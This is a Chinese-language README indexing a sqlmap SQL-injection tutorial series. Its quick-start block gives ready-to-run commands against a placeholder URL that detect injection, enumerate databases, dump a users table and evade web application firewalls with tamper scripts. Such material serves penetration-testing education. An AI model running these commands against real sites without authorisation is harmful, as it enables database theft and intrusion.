# sqlmap 使用指南

> sqlmap 是自动化 SQL 注入检测与利用工具，支持多种数据库和注入类型，是 SQL 注入测试的瑞士军刀。

---

## 文件结构

| 文件/目录 | 说明 |
|----------|------|
| [sqlmap使用指南.md](./sqlmap使用指南.md) | 完整使用指南（原始详细文档） |
| [01-常用命令速查表.md](./01-常用命令速查表.md) | 常用命令/参数速查表，快速查阅 |
| [02-实战使用场景示例.md](./02-实战使用场景示例.md) | 10 种实战场景的完整操作流程 |
| [03-高级技巧和绕过技术.md](./03-高级技巧和绕过技术.md) | WAF 绕过/Tamper 高级用法/性能优化 |
| [04-常见问题与解决方案.md](./04-常见问题与解决方案.md) | 22 个常见问题及详细解决方案 |

---

## 快速开始

```bash
# 基础检测
sqlmap -u "http://target.com/page?id=1" --batch

# 获取数据库
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# 导出数据
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump --batch

# WAF 绕过
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase --random-agent --batch
```

更多内容请查看各分文档。

---

## 学习建议

1. **入门**：先阅读完整使用指南的基础部分，掌握常用命令
2. **速查**：日常使用中查阅 `01-常用命令速查表.md`
3. **实战**：参考 `02-实战使用场景示例.md` 进行场景化练习
4. **进阶**：学习 `03-高级技巧和绕过技术.md` 提升技能
5. **排错**：遇到问题查阅 `04-常见问题与解决方案.md`
